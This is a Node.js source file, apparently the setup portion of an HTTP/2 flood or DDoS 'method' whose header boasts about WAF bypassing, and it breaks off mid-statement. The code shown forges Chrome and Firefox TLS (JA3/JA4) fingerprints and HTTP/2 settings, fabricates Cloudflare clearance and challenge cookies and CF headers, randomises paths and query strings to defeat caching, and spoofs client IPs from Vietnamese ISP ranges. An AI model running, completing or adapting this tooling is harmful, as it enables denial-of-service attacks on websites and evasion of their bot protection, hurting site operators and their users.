// js-h2 method made by @clf_bypass with luv 01/06/2026
// waf bypassing is ez xD
const colors = require('colors');
const net = require("net");
const url = require('url');
const fs = require('fs');
const http2 = require('http2');
const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const crypto = require('crypto');
const { v4: uuidv4 } = require('uuid');
const os = require("os");
const v8 = require('v8');

const HTTP2_FRAME_TYPES = {
    DATA: 0x00,
    HEADERS: 0x01,
    PRIORITY: 0x02,
    RST_STREAM: 0x03,
    SETTINGS: 0x04,
    PUSH_PROMISE: 0x05,
    PING: 0x06,
    GOAWAY: 0x07,
    WINDOW_UPDATE: 0x08,
    CONTINUATION: 0x09,
    ALTSVC: 0x0a,
    ORIGIN: 0x0c,
    PRIORITY_UPDATE: 0x10
};

const HTTP2_FLAGS = {
    END_STREAM: 0x1,
    END_HEADERS: 0x4,
    PRIORITY: 0x20
};

const HTTP2_ERROR_CODES = {
    NO_ERROR: 0x00,
    PROTOCOL_ERROR: 0x01,
    INTERNAL_ERROR: 0x02,
    FLOW_CONTROL_ERROR: 0x03,
    SETTINGS_TIMEOUT: 0x04,
    STREAM_CLOSED: 0x05,
    FRAME_SIZE_ERROR: 0x06,
    REFUSED_STREAM: 0x07,
    CANCEL: 0x08,
    COMPRESSION_ERROR: 0x09,
    CONNECT_ERROR: 0x0a,
    ENHANCE_YOUR_CALM: 0x0b,
    INADEQUATE_SECURITY: 0x0c,
    HTTP_1_1_REQUIRED: 0x0d
};

const HTTP2_SETTINGS = {
    HEADER_TABLE_SIZE: 0x01,
    ENABLE_PUSH: 0x02,
    MAX_CONCURRENT_STREAMS: 0x03,
    INITIAL_WINDOW_SIZE: 0x04,
    MAX_FRAME_SIZE: 0x05,
    MAX_HEADER_LIST_SIZE: 0x06,
    ENABLE_CONNECT_PROTOCOL: 0x08,
    NO_RFC7540_PRIORITIES: 0x09,
    TLS_RENEG_PERMITTED: 0x10,
    ENABLE_METADATA: 0x4d44
};

const HTTP2_SETTINGS_DEFAULTS = {
    [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 4096,
    [HTTP2_SETTINGS.ENABLE_PUSH]: 1,
    [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: Number.MAX_SAFE_INTEGER,
    [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 65535,
    [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
    [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: Number.MAX_SAFE_INTEGER,
    [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 0,
    [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
    [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
    [HTTP2_SETTINGS.ENABLE_METADATA]: 0
};

function transformSettings(settings) {
    const settingsMap = {
        "SETTINGS_HEADER_TABLE_SIZE": HTTP2_SETTINGS.HEADER_TABLE_SIZE,
        "SETTINGS_ENABLE_PUSH": HTTP2_SETTINGS.ENABLE_PUSH,
        "SETTINGS_MAX_CONCURRENT_STREAMS": HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS,
        "SETTINGS_INITIAL_WINDOW_SIZE": HTTP2_SETTINGS.INITIAL_WINDOW_SIZE,
        "SETTINGS_MAX_FRAME_SIZE": HTTP2_SETTINGS.MAX_FRAME_SIZE,
        "SETTINGS_MAX_HEADER_LIST_SIZE": HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE,
        "SETTINGS_ENABLE_CONNECT_PROTOCOL": HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL,
        "SETTINGS_NO_RFC7540_PRIORITIES": HTTP2_SETTINGS.NO_RFC7540_PRIORITIES,
        "SETTINGS_TLS_RENEG_PERMITTED": HTTP2_SETTINGS.TLS_RENEG_PERMITTED,
        "SETTINGS_ENABLE_METADATA": HTTP2_SETTINGS.ENABLE_METADATA
    };
    return settings.map(([key, value]) => [settingsMap[key] || key, value]);
}

function h2Settings(browser) {
    const baseSettings = { ...HTTP2_SETTINGS_DEFAULTS };
    const browserSettings = {
        chrome: {
            [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_PUSH]: 0,
            [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 1000,
            [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 6291456,
            [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
            [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 262144,
            [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 1,
            [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
            [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
            [HTTP2_SETTINGS.ENABLE_METADATA]: 0
        },
        firefox: {
            [HTTP2_SETTINGS.HEADER_TABLE_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_PUSH]: 0,
            [HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS]: 128,
            [HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]: 131072,
            [HTTP2_SETTINGS.MAX_FRAME_SIZE]: 16384,
            [HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE]: 65536,
            [HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL]: 1,
            [HTTP2_SETTINGS.NO_RFC7540_PRIORITIES]: 0,
            [HTTP2_SETTINGS.TLS_RENEG_PERMITTED]: 0,
            [HTTP2_SETTINGS.ENABLE_METADATA]: 0
        }
    };
    const selectedSettings = browserSettings[browser] || browserSettings.chrome;
    const settings = [];
    for (const [key, value] of Object.entries(selectedSettings)) {
        const settingName = Object.entries(HTTP2_SETTINGS).find(([name, code]) => code == key)?.[0];
        if (settingName) {
            settings.push([`SETTINGS_${settingName}`, value]);
        }
    }
    return Object.fromEntries(settings);
}

function generateJA3Fingerprint(browser) {
    const ja3Strings = {
        chrome: "771,4865-4866-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,35-18-16-43-65037-23-5-51-65281-0-27-45-11-10-13-17613,4588-29-23-24,0",
        firefox: "771,4865-4867-4866-49195-49199-52393-52392-49196-49200-49162-49161-49171-49172-156-157-47-53,0-23-65281-10-11-16-5-34-18-51-43-13-45-28-27-65037-41,4588-29-23-24-25-256-257,0"
    };
    const ja3String = ja3Strings[browser];
    const hash = crypto.createHash('md5');
    hash.update(ja3String);
    const ja3Hash = hash.digest('hex');
    const [tls_version, cipherSuitesStr, extensionsStr, ecCurvesStr, ecPointFormatsStr] = ja3String.split(',');
    return {
        ja3: ja3String,
        ja3_hash: ja3Hash,
        ja3String: ja3String,
        ja3Hash: ja3Hash,
        components: {
            tls_version: tls_version,
            cipherSuites: cipherSuitesStr.split('-'),
            extensions: extensionsStr.split('-'),
            ecCurves: ecCurvesStr.split('-'),
            ecPointFormats: ecPointFormatsStr.split('-')
        }
    };
}

function generateJA4Fingerprint(browserType) {
    const browserProfiles = {
        chrome: {
            quic: 'c13f',
            alpnList: ['h2', 'http/1.1'],
            signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'],
            extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281']
        },
        firefox: {
            quic: 'c13f',
            alpnList: ['h2', 'http/1.1'],
            signatureAlgorithms: ['ecdsa_secp256r1_sha256', 'rsa_pss_rsae_sha256'],
            extensionsOrder: ['0', '5', '10', '11', '13', '16', '21', '23', '28', '35', '65281']
        }
    };
    const profile = browserProfiles[browserType] || browserProfiles.chrome;
    const alpnStr = profile.alpnList[0].length.toString().padStart(2, '0') + profile.alpnList[0];
    const sigAlgStr = profile.signatureAlgorithms.slice(0, 2).join('_').substring(0, 4);
    const extHash = profile.extensionsOrder.map(e => e.charAt(0)).join('').substring(0, 8);
    const ja4 = `${profile.quic}_${alpnStr}_${sigAlgStr}_${extHash}`;
    const hash = crypto.createHash('md5');
    hash.update(ja4);
    const ja4Hash = hash.digest('hex').substring(0, 16);
    return { ja4: ja4, ja4_hash: ja4Hash };
}

function generateFakePlugins(browser) {
    const pdfPlugins = [
        {name: "Chrome PDF Plugin", description: "Portable Document Format", filename: "internal-pdf-viewer", mimeTypes: ["application/pdf"]},
        {name: "PDF.js", description: "Portable Document Format", filename: "pdf.js", mimeTypes: ["application/pdf"]}
    ];
    const flashPlugins = [
        {name: "Shockwave Flash", description: "Shockwave Flash 32.0 r0", filename: "pepflashplayer.dll", mimeTypes: ["application/x-shockwave-flash"]}
    ];
    const mediaPlugins = [
        {name: "QuickTime Plug-in", description: "The QuickTime Plugin allows you to view a wide variety of multimedia", filename: "npqtplugin.dll", mimeTypes: ["video/quicktime", "image/x-macpaint", "image/x-quicktime"]},
        {name: "VLC Web Plugin", description: "VLC Web Plugin", filename: "npvlc.dll", mimeTypes: ["application/x-vlc-plugin", "video/x-msvideo"]},
        {name: "Windows Media Player Plug-in", description: "Windows Media Player Plugin", filename: "np-mswmp.dll", mimeTypes: ["application/x-ms-wmp", "video/x-ms-asf"]}
    ];
    const chromePlugins = [
        {name: "Native Client", description: "Native Client", filename: "internal-nacl-plugin", mimeTypes: ["application/x-nacl", "application/x-pnacl"]},
        {name: "Chrome Remote Desktop Viewer", description: "This plugin allows you to securely access other computers", filename: "internal-remoting-viewer", mimeTypes: ["application/vnd.chromium.remoting-viewer"]}
    ];
    const firefoxPlugins = [
        {name: "Widevine Content Decryption Module", description: "Enables Widevine licenses for playback of HTML audio/video content.", filename: "libwidevinecdm.so", mimeTypes: ["application/x-ppapi-widevine-cdm"]},
        {name: "OpenH264 Video Codec", description: "OpenH264 Video Codec provided by Cisco Systems, Inc.", filename: "openh264.dll", mimeTypes: ["video/h264"]}
    ];
    let plugins = [...pdfPlugins];
    if (browser === 'chrome') {
        plugins = [...plugins, ...chromePlugins];
        if (Math.random() < 0.7) {
            plugins.push(mediaPlugins[Math.floor(Math.random() * mediaPlugins.length)]);
        }
    } else {
        plugins = [...plugins, ...firefoxPlugins];
    }
    if (Math.random() < 0.2) {
        plugins.push(flashPlugins[0]);
    }
    const pluginsInfo = plugins.map(plugin => {
        return {
            name: plugin.name,
            description: plugin.description,
            mimeTypes: plugin.mimeTypes.join(',')
        };
    });
    return {
        count: plugins.length,
        list: pluginsInfo
    };
}

function addPluginHeaders(headers, browser) {
    const plugins = generateFakePlugins(browser);
    headers["sec-ch-ua-plugins"] = `"Plugins: ${plugins.count}"`;
    const randomId = Math.floor(Math.random() * 1000000);
    headers["x-plugins-data"] = `id=${randomId};count=${plugins.count}`;
    if (Math.random() < 0.7) {
        headers["sec-ch-ua-full-version-list"] = (headers["sec-ch-ua-full-version-list"] || '') + `;v="plugins:${plugins.count}"`;
    }
    return headers;
}

function createRealisticClientHello(browser) {
    const ja3Data = generateJA3Fingerprint(browser);
    const ja4Data = generateJA4Fingerprint(browser);
    const plugins = generateFakePlugins(browser);
    let tlsVersions;
    if (browser === 'chrome') {
        tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    } else {
        tlsVersions = { min: "TLSv1.2", max: "TLSv1.3" };
    }
    const addCloudflareGrease = Math.random() < 0.7;
    let cipherList = browser === 'chrome' ?
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305" :
        "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305";
    const alpnProtocols = ['h2', 'http/1.1'];
    let ecdhCurve;
    if (addCloudflareGrease) {
        ecdhCurve = "GREASE:X25519:secp256r1:secp384r1:secp521r1";
    } else {
        ecdhCurve = "X25519:secp256r1:secp384r1:secp521r1";
    }
    let appData = "";
    if (plugins && plugins.count > 0) {
        const pluginNames = plugins.list.map(p => p.name.substring(0, 3)).join('');
        appData = `${browser}-${plugins.count}-${pluginNames}`;
    }
    return {
        tlsVersions: tlsVersions,
        ciphers: cipherList,
        ecdhCurve: ecdhCurve,
        alpnProtocols: alpnProtocols,
        ja3: ja3Data,
        ja4: ja4Data,
        signatureAlgorithms: browser === 'chrome' ?
            'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384' :
            'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha256',
        plugins: plugins,
        appData: appData
    };
}

function getRandomBrowser() {
    return Math.random() < 0.5 ? "chrome" : "firefox";
}

function randstr(length) {
   const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * characters.length));
   }
   return result;
}

function randomElement(elements) {
  if (!elements || elements.length === 0) return undefined;
  return elements[Math.floor(Math.random() * elements.length)];
}

function generateCacheHeaders() {
    const headers = {};
    headers["cache-control"] = randomElement([
        "no-cache, no-store, must-revalidate, max-age=0",
        "max-age=0, no-cache, no-store, must-revalidate",
        "no-store, no-cache, must-revalidate, proxy-revalidate",
        "no-cache, must-revalidate, proxy-revalidate, max-age=0"
    ]);
    headers["pragma"] = "no-cache";
    headers["expires"] = "0";
    headers["x-cache-buster"] = randstr(10);
    const additionalHeaderCount = Math.floor(Math.random() * 3);
    const possibleHeaders = [
        () => { headers["CF-Cache-Status"] = randomElement(["BYPASS", "DYNAMIC", "EXPIRED"]); },
        () => { headers["CF-IPCountry"] = randomElement(["US", "GB", "DE", "FR", "JP", "AU", "CA"]); },
        () => { const rayId = randstr(16).toLowerCase(); headers["CF-RAY"] = `${rayId}-${randomElement(["FRA", "AMS", "LHR", "CDG"])}`; },
        () => { headers["Age"] = "0"; }
    ];
    const selectedIndices = new Set();
    while (selectedIndices.size < additionalHeaderCount && selectedIndices.size < possibleHeaders.length) {
        const randomIndex = Math.floor(Math.random() * possibleHeaders.length);
        if (!selectedIndices.has(randomIndex)) {
            selectedIndices.add(randomIndex);
            try { possibleHeaders[randomIndex](); } catch(e) {}
        }
    }
    return headers;
}

function generateRandomQueryString(originalPath) {
    try {
        const timestamp = Date.now();
        let queryParams = [];
        const timeParamNames = ["_", "t", "ts", "time", "timestamp", "cache"];
        queryParams.push(`${randomElement(timeParamNames)}=${timestamp}`);
        const numParams = Math.floor(Math.random() * 3) + 1;
        for (let i = 0; i < numParams; i++) {
            const paramName = randstr(4).toLowerCase();
            const paramValue = randstr(5);
            queryParams.push(`${paramName}=${paramValue}`);
        }
        const queryString = queryParams.join('&');
        return originalPath.includes('?') ? '&' + queryString : '?' + queryString;
    } catch (error) {
        return originalPath.includes('?') ? '&_=' + Date.now() : '?_=' + Date.now();
    }
}

function generateRandomPath(originalPath) {
    try {
        if (Math.random() < 0.8) return originalPath;
        let basePath = originalPath.split('?')[0];
        return basePath + '/' + randstr(5).toLowerCase();
    } catch (error) {
        return originalPath;
    }
}

function bypassCache(hostname, path) {
    const result = { headers: {}, queryString: '', randomizedPath: '' };
    try {
        result.headers = generateCacheHeaders();
        result.queryString = generateRandomQueryString(path);
        result.randomizedPath = generateRandomPath(path);
        result.fullPath = result.randomizedPath + result.queryString;
        return result;
    } catch (error) {
        return result;
    }
}

function generateClickIdParams() {
    const gclid = 'Cj' + randstr(28) + crypto.randomBytes(4).toString('hex');
    const msclkid = crypto.randomBytes(16).toString('hex');
    const twclid = randstr(24) + crypto.randomBytes(6).toString('hex');
    const li_fat_id = Math.floor(Math.random() * 1e16).toString();
    const epik = randstr(32) + '_' + Date.now();
    
    return `&gclid=${gclid}&msclkid=${msclkid}&twclid=${twclid}&li_fat_id=${li_fat_id}&epik=${epik}`;
}

const createHTTP2Frame = (type, flags, streamId, payload) => {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt8((payload.length >> 16) & 0xFF, 0);
    frame.writeUInt8((payload.length >> 8) & 0xFF, 1);
    frame.writeUInt8(payload.length & 0xFF, 2);
    frame.writeUInt8(type, 3);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId & 0x7FFFFFFF, 5);
    payload.copy(frame, 9);
    return frame;
};

const createSettingsFrame = (settings, flags = 0) => {
    const numSettings = Object.keys(settings).length;
    const payload = Buffer.alloc(numSettings * 6);
    let offset = 0;
    for (const [id, value] of Object.entries(settings)) {
        payload.writeUInt16BE(Number(id), offset);
        payload.writeUInt32BE(Number(value), offset + 2);
        offset += 6;
    }
    return createHTTP2Frame(HTTP2_FRAME_TYPES.SETTINGS, flags, 0, payload);
};

const createWindowUpdateFrame = (streamId, windowSizeIncrement) => {
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(windowSizeIncrement & 0x7FFFFFFF, 0);
    return createHTTP2Frame(HTTP2_FRAME_TYPES.WINDOW_UPDATE, 0, streamId, payload);
};

const createRandomFrame = () => {
    const frameTypes = [HTTP2_FRAME_TYPES.PING, HTTP2_FRAME_TYPES.WINDOW_UPDATE, HTTP2_FRAME_TYPES.SETTINGS];
    const type = frameTypes[Math.floor(Math.random() * frameTypes.length)];
    let payload, streamId = 0;
    switch (type) {
        case HTTP2_FRAME_TYPES.PING:
            payload = crypto.randomBytes(8);
            break;
        case HTTP2_FRAME_TYPES.WINDOW_UPDATE:
            payload = Buffer.alloc(4);
            streamId = Math.floor(Math.random() * 10) + 1;
            payload.writeUInt32BE(Math.floor(Math.random() * 10000000) + 1000000, 0);
            break;
        case HTTP2_FRAME_TYPES.SETTINGS:
            payload = Buffer.alloc(6);
            payload.writeUInt16BE(HTTP2_SETTINGS.INITIAL_WINDOW_SIZE, 0);
            payload.writeUInt32BE(Math.floor(Math.random() * 10000000) + 1000000, 2);
            break;
        default:
            payload = Buffer.alloc(0);
    }
    return createHTTP2Frame(type, 0, streamId, payload);
};

const createPriorityFrame = (streamId, priorityData) => {
    const payload = Buffer.alloc(5);
    const exclusiveBit = priorityData.exclusive ? 0x80000000 : 0;
    const dependencyWithE = (priorityData.depends_on & 0x7FFFFFFF) | exclusiveBit;
    payload.writeUInt32BE(dependencyWithE, 0);
    payload.writeUInt8(priorityData.weight - 1, 4);
    return createHTTP2Frame(HTTP2_FRAME_TYPES.PRIORITY, 0, streamId, payload);
};

const createGoawayFrame = (lastStreamId, errorCode) => {
    const payload = Buffer.alloc(8);
    payload.writeUInt32BE(lastStreamId & 0x7FFFFFFF, 0);
    payload.writeUInt32BE(errorCode, 4);
    return createHTTP2Frame(HTTP2_FRAME_TYPES.GOAWAY, 0, 0, payload);
};

const createHeadersFrameWithPriority = (streamId, headers, priorityData, endStream = true) => {
    let hpack = new (require('hpack'))();
    const encodedHeaders = hpack.encode(headers);
    const prioritySize = priorityData ? 5 : 0;
    const payload = Buffer.alloc(prioritySize + encodedHeaders.length);
    let offset = 0;
    if (priorityData) {
        const exclusiveBit = priorityData.exclusive ? 0x80000000 : 0;
        const dependencyWithE = (priorityData.depends_on & 0x7FFFFFFF) | exclusiveBit;
        payload.writeUInt32BE(dependencyWithE, 0);
        payload.writeUInt8(priorityData.weight - 1, 4);
        offset = 5;
    }
    encodedHeaders.copy(payload, offset);
    let flags = 0;
    if (endStream) flags |= HTTP2_FLAGS.END_STREAM;
    flags |= HTTP2_FLAGS.END_HEADERS;
    if (priorityData) flags |= HTTP2_FLAGS.PRIORITY;
    return createHTTP2Frame(HTTP2_FRAME_TYPES.HEADERS, flags, streamId, payload);
};

function createHttp2SessionOptions(browser, clientHello) {
    const browserSettings = h2Settings(browser);
    const defaultSettings = { ...HTTP2_SETTINGS_DEFAULTS };
    const baseSessionOptions = {
        maxSessionMemory: 10000,
        maxDeflateDynamicTableSize: 4294967295,
        maxOutstandingPings: 10,
        maxHeaderPairs: 128,
        maxOutstandingSettings: 1000,
        maxReservedRemoteStreams: 200,
        peerMaxConcurrentStreams: browserSettings.SETTINGS_MAX_CONCURRENT_STREAMS || defaultSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
        paddingStrategy: 0,
        maxHeaderListSize: browserSettings.SETTINGS_MAX_HEADER_LIST_SIZE || defaultSettings[HTTP2_SETTINGS.MAX_HEADER_LIST_SIZE],
        maxFrameSize: browserSettings.SETTINGS_MAX_FRAME_SIZE || defaultSettings[HTTP2_SETTINGS.MAX_FRAME_SIZE],
        maxConcurrentStreams: browserSettings.SETTINGS_MAX_CONCURRENT_STREAMS || defaultSettings[HTTP2_SETTINGS.MAX_CONCURRENT_STREAMS],
        headerTableSize: browserSettings.SETTINGS_HEADER_TABLE_SIZE || defaultSettings[HTTP2_SETTINGS.HEADER_TABLE_SIZE],
        enableConnectProtocol: (browserSettings.SETTINGS_ENABLE_CONNECT_PROTOCOL === 1) || (defaultSettings[HTTP2_SETTINGS.ENABLE_CONNECT_PROTOCOL] === 1),
        enablePush: (browserSettings.SETTINGS_ENABLE_PUSH === 1) || (defaultSettings[HTTP2_SETTINGS.ENABLE_PUSH] === 1),
        enableUserAgentHeader: false
    };
    if (clientHello.plugins && clientHello.plugins.count > 0) {
        const pluginCount = clientHello.plugins.count;
        return {
            ...baseSessionOptions,
            maxSessionMemory: baseSessionOptions.maxSessionMemory + (pluginCount * 100),
            maxReservedRemoteStreams: baseSessionOptions.maxReservedRemoteStreams + (pluginCount * 2),
            peerMaxConcurrentStreams: Math.min(pluginCount * 50 + baseSessionOptions.peerMaxConcurrentStreams, 500),
            paddingStrategy: pluginCount > 2 ? 1 : 0,
            autoDecompressData: true,
            initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || defaultSettings[HTTP2_SETTINGS.INITIAL_WINDOW_SIZE]
        };
    }
    if (browser === 'chrome') {
        return { ...baseSessionOptions, maxSessionMemory: 15000, initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || 6291456 };
    } else {
        return { ...baseSessionOptions, maxSessionMemory: 8000, initialWindowSize: browserSettings.SETTINGS_INITIAL_WINDOW_SIZE || 131072, maxHeaderListSize: browserSettings.SETTINGS_MAX_HEADER_LIST_SIZE || 65536 };
    }
}

function getBrowserPriorityData(browser) {
    if (browser === 'firefox') {
        return { exclusive: 0, depends_on: 0, weight: 42 };
    } else {
        return { exclusive: 1, depends_on: 0, weight: 256 };
    }
}

function applyBrowserPriority(stream, browser) {
    if (!stream || typeof stream.priority !== 'function') return;
    try {
        const priorityData = getBrowserPriorityData(browser);
        stream.priority({ exclusive: priorityData.exclusive, parent: priorityData.depends_on, weight: priorityData.weight });
    } catch(e) {}
}

function generateBypassCookie() {
    const timestampString = Math.floor(Date.now() / 1000);
    return `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.2.1.1-${randstr(6)}+${randstr(80)}=`;
}

function generateAdditionalCfCookies() {
    const cookies = [];
    cookies.push(`__cf_bm=${randstr(32)}-${Math.floor(Date.now() / 1000)}-${randstr(8)}`);
    cookies.push(`cf_chl_2=${randstr(10)}`);
    cookies.push(`cf_chl_prog=x${Math.floor(Math.random() * 19) + 1}`);
    cookies.push(`cf_chl_3=${randstr(16)}`);
    cookies.push(`cf_ob_info=${randstr(20)}`);
    return cookies;
}

function generateBfmCookies() {
    let cookieString = generateBypassCookie();
    const additional = generateAdditionalCfCookies();
    cookieString += '; ' + additional.join('; ');
    return cookieString;
}

function generateLegitIP() {
    const asnData = [
        { asn: "AS7552", country: "VN", provider: "Viettel", ip: "14.160." },
        { asn: "AS7552", country: "VN", provider: "Viettel", ip: "113.22." },
        { asn: "AS18403", country: "VN", provider: "FPT", ip: "123.30." },
        { asn: "AS18403", country: "VN", provider: "FPT", ip: "118.68." },
        { asn: "AS45899", country: "VN", provider: "VNPT", ip: "113.162." },
        { asn: "AS45899", country: "VN", provider: "VNPT", ip: "171.224." },
        { asn: "AS38231", country: "VN", provider: "CMC", ip: "103.21." },
        { asn: "AS38731", country: "VN", provider: "VNPT", ip: "27.68." }
    ];
    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

Array.prototype.shuffle = function () {
    return this.sort(() => Math.random() - 0.5);
};
Object.prototype.shuffle = function () {
    const object = {};
    Object.keys(this).shuffle().forEach(key => object[key] = this[key]);
    return object;
};

const block = [".", "-", "&"].join("");
let maprate = [];
const secureOptionsList = [
    crypto.constants.SSL_OP_NO_RENEGOTIATION,
    crypto.constants.SSL_OP_NO_TICKET,
    crypto.constants.SSL_OP_NO_SSLv2,
    crypto.constants.SSL_OP_NO_SSLv3,
    crypto.constants.SSL_OP_NO_COMPRESSION,
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
    crypto.constants.SSL_OP_TLSEXT_PADDING,
    crypto.constants.SSL_OP_ALL
];
const defaultCipherSuites = crypto.constants.defaultCoreCipherList.split(":");
const customCipherSuites = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    ...defaultCipherSuites
].join(":");
const pathii = [
    ".html", ".htm", ".css", ".js", ".jpg", ".jpeg", ".png", ".gif", ".svg",
    ".webp", ".woff", ".woff2", ".ttf", ".otf", ".eot", ".ico",
    ".json", ".xml", ".mp4", ".webm", ".ogg"
];
const randomPath = pathii[Math.floor(Math.random() * pathii.length)];
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "ecdsa_secp384r1_sha384",
    "ecdsa_secp521r1_sha512",
    "rsa_pss_rsae_sha256",
    "rsa_pss_rsae_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha256",
    "rsa_pkcs1_sha384",
    "rsa_pkcs1_sha512"
].join(":");
function eko(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}
const ecdh = [
    "X25519",
    "P-256",
    "P-384",
    "P-521",
    "ffdhe2048",
    "ffdhe3072"
].join(":");
const sysgay = [
    "Macintosh",
    "Windows 1.01",
    "Windows 1.02",
    "Windows 1.03",
    "Windows 1.04",
    "Windows 2.01",
    "Windows 3.0",
    "Windows NT 3.1",
    "Windows NT 3.5",
    "Windows 95",
    "Windows 98",
    "Windows 2006",
    "Windows NT 4.0",
    "Windows 95 Edition",
    "Windows 98 Edition",
    "Windows Me",
    "Windows Business",
    "Windows XP",
    "Windows 7",
    "Windows 8",
    "Windows 10 version 1507",
    "Windows 10 version 1511",
    "Windows 10 version 1607",
    "Windows 10 version 1703"
];
const winarch = [
    "rv:40.0",
    "rv:41.0",
    "x86-16",
    "x86-16, IA32",
    "IA-32",
    "IA-32, Alpha, MIPS",
    "IA-32, Alpha, MIPS, PowerPC",
    "Itanium",
    "x86_64",
    "IA-32, x86-64",
    "IA-32, x86-64, ARM64",
    "x86-64, ARM64",
    "ARMv4, MIPS, SH-3",
    "ARMv4",
    "ARMv5",
    "ARMv7",
    "IA-32, x86-64, Itanium",
    "IA-32, x86-64, Itanium",
    "x86-64, Itanium"
];
const winch = [
    "Intel Mac OS X 10.9",
    "Intel Mac OS X 10.7",
    "Intel Mac OS X 10_10_3",
    "Intel Mac OS X 10_10_1",
    "Intel Mac OS X 10_10_4",
    "2012 R2",
    "Win 64",
    "2019 R2",
    "2012 R2 Datacenter",
    "Server Blue",
    "Longhorn Server",
    "Whistler Server",
    "Shell Release",
    "Daytona",
    "Razzle",
    "HPC 2008"
];
var nm2 = sysgay[Math.floor(Math.random() * sysgay.length)];
var nm3 = winarch[Math.floor(Math.random() * winarch.length)];
var nm5 = winch[Math.floor(Math.random() * winch.length)];
const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
const headerFunc = {
